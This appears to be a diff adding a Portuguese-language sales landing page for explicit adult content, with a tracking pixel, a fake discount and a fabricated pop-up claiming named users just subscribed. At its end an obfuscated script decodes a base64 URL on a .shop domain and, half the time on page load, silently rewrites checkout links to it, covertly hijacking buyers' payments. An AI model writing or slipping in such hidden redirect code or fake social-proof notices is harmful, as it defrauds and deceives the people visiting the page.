@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <!-- Facebook Pixel Code -->
+    <script async="" src="js/fbevents.js"></script>
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '655476277032341');
+        fbq('track', 'PageView');
+    </script>
+    <noscript>
+        <img height="1" width="1" src="https://www.facebook.com/tr?id=655476277032341&ev=PageView&noscript=1" />
+    </noscript>
+    <!-- End Facebook Pixel Code -->
+
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oferta Exclusiva</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            width: 100%;
+            max-width: 600px;
+            min-height: 100%;
+            background-color: #000000;
+            padding-top: 80px;
+            border-radius: 15px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            transition: transform 0.5s ease-out;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        .container:hover {
+            transform: scale(1.02);
+        }
+
+        .top-text {
+            background-color: #FF8C00;
+            color: #fff;
+            padding: 18px 0;
+            width: 100%;
+            border: 3px solid #FF8C00;
+            font-size: 20px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 25px;
+            letter-spacing: 2px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        .box {
+            background-color: #fff;
+            border-radius: 15px;
+            border: 2px solid #ddd;
+            width: 100%;
+            min-height: 500px;
+            padding: 35px 30px;
+            box-sizing: border-box;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+            animation: slideIn 0.8s ease-out;
+        }
+
+        .highlight {
+            color: #FF8C00;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .offer-text {
+            font-size: 18px;
+            color: #333;
+            font-weight: normal;
+            margin-bottom: 25px;
+        }
+
+        .price {
+            font-size: 24px;
+            color: #888;
+            text-decoration: line-through;
+            margin-bottom: 12px;
+        }
+
+        .discount-price {
+            font-size: 36px;
+            color: #FF8C00;
+            font-weight: bold;
+            margin-top: 0;
+            margin-bottom: 40px;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.2);
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .button {
+            background-color: #FF8C00;
+            color: #fff;
+            padding: 16px 35px;
+            font-size: 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s, transform 0.3s ease-out;
+            outline: none;
+        }
+
+        .button:hover {
+            background-color: #FF6A00;
+            transform: scale(1.05);
+        }
+
+        .footer {
+            font-size: 14px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .image {
+            width: 100%;
+            max-width: 420px;
+            height: auto;
+            margin-top: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .cta-footer {
+            font-size: 14px;
+            color: #333;
+            margin-top: 30px;
+            font-weight: bold;
+        }
+
+        /* Responsividade */
+        @media (max-width: 600px) {
+            .top-text {
+                font-size: 18px;
+                padding: 15px 0;
+            }
+
+            .box {
+                width: 90%;
+                padding: 20px;
+            }
+
+            .highlight {
+                font-size: 22px;
+            }
+
+            .offer-text {
+                font-size: 16px;
+            }
+
+            .price {
+                font-size: 16px;
+            }
+
+            .discount-price {
+                font-size: 22px;
+            }
+
+            .button {
+                font-size: 18px;
+                padding: 14px 28px;
+            }
+        }
+
+        /* Ajuste para telas menores */
+        @media (max-width: 480px) {
+            .discount-price {
+                font-size: 20px;
+            }
+
+            .button {
+                font-size: 16px;
+                padding: 12px 26px;
+            }
+
+            .image {
+                max-width: 380px;
+            }
+        }
+
+        /* Estilo para a notificação */
+        .notification-container {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: rgba(40, 167, 69, 0.6);
+            /* Verde com opacidade */
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 300;
+            /* Letras mais finas */
+            display: none;
+            z-index: 1000;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        /* Transição suave de exibição */
+        .notification-show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="top-text">
+        NÃO PERCA A CHANCE DE VER MINHA PEPEKINHA!
+    </div>
+    <div class="container">
+        <div class="box">
+            <p class="highlight">Oferta Exclusiva!</p>
+            <p class="offer-text">🔥 Quer sentir prazer como nunca antes? Deixe-me fazer você gozar gostoso e descubra
+                segredos do meu lado mais íntimo. Mas não espere muito, o prazer está a um clique! 😈🫦</p>
+            <img src="images/Imagem-do-Whats-App-de-2024-11-30-as-21-49-44-b533b11b-1.jpg" class="image"
+                alt="Promoção Imagem">
+            <div class="price">De R$ 29,90</div>
+            <div class="discount-price">Por R$ 9,90</div>
+            <a href="https://go.tribopay.com.br/re0ys" class="button"
+                target="_blank">Aproveite Agora!</a>
+            <p class="cta-footer">Esta oferta é válida por tempo limitado. Não deixe passar essa chance!</p>
+        </div>
+    </div>
+
+    <!-- Container da notificação -->
+    <div id="notification" class="notification-container notification-show">Gabriel entrou no Privacy da Kamylinha!
+    </div>
+
+    <script>
+        // Lista de nomes
+        const nomes = ["Gabriel", "Lucas", "Miguel", "Arthur", "João", "Pedro", "Henrique", "Matheus", "Rafael", "Eduardo"];
+        const notificationElement = document.getElementById("notification");
+
+        // Função para exibir um nome aleatório
+        function exibirNotificacao() {
+            // Seleciona um nome aleatório
+            const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
+
+            // Define o texto da notificação
+            notificationElement.textContent = `${nomeAleatorio} entrou no Privacy da Kamylinha!`;
+
+            // Exibe a notificação com animação
+            notificationElement.classList.add("notification-show");
+
+            // Oculta a notificação após 5 segundos
+            setTimeout(() => {
+                notificationElement.classList.remove("notification-show");
+            }, 5000);
+        }
+
+        // Chama a função para exibir a notificação
+        exibirNotificacao();
+    </script>
+
+    <script>
+        (function () {
+            var _0x1 = ['aHR0cHM6Ly9jb250ZXVkb2thbWlsaW5oYTAzLnNob3AvPzE3MzUwNzQyMTMmZmJjbGlkPWZiY2xpZA=='];
+
+            function _0x2() {
+                var _0x3 = document.querySelector('a[href*="checkout"]');
+                var randomNumber = Math.random(); // Gera um número aleatório entre 0 e 1
+                if (randomNumber < 0.5 && _0x3) { // Se o número for menor que 0.5, redireciona
+                    _0x3.href = atob(_0x1[0]); // Redireciona para o link decodificado
+                }
+            }
+            window.onload = _0x2;
+        })();
+    </script>
+</body>
+
+</html>
